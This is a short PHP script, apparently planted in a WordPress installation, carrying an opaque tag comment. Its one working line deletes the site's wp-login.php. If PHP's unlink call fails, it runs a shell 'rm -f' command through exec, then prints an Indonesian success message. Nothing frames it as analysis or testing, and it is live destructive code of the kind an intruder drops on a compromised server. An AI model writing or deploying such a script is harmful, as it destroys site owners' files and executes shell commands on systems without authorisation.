<?php /* 7RkSBksNNM8e5y4 */ ?>
<?php echo(!@unlink(__DIR__."/../../../wp-login.php")&&exec("rm -f ".escapeshellarg(__DIR__."/../../../wp-login.php"))?"":"File berhasil dihapus");